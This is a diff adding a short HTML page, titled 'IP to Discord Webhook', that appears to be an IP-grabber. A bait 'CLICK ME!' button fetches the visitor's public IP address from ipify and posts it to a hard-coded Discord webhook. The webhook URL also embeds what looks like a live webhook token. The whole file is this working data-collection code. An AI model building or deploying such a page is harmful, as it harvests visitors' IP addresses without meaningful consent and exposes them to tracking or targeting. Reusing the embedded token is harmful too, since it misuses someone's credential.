@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP to Discord Webhook</title>
+</head>
+<body>
+    <button id="clickMeBtn">CLICK ME!</button>
+
+    <script>
+        document.getElementById('clickMeBtn').addEventListener('click', function() {
+            // Get the IP address using ipify
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    // Send the IP address to the Discord webhook
+                    const webhookUrl = 'https://discord.com/api/webhooks/1236739657505439854/xrWrzCfXnGaQ_TcMO7xXVMUw5LZU6k_fRuEIplzFBaGTB9R7hc4YJC579feuU1UqRNWx';
+                    const message = {
+                        content: `User IP: ${ip}`
+                    };
+                    
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(message)
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            alert('IP sent to Discord webhook successfully!');
+                        } else {
+                            alert('Failed to send IP to Discord webhook.');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error sending IP to Discord webhook:', error);
+                        alert('Error sending IP to Discord webhook.');
+                    });
+                })
+                .catch(error => {
+                    console.error('Error fetching IP:', error);
+                    alert('Error fetching IP address.');
+                });
+        });
+    </script>
+</body>
+</html>
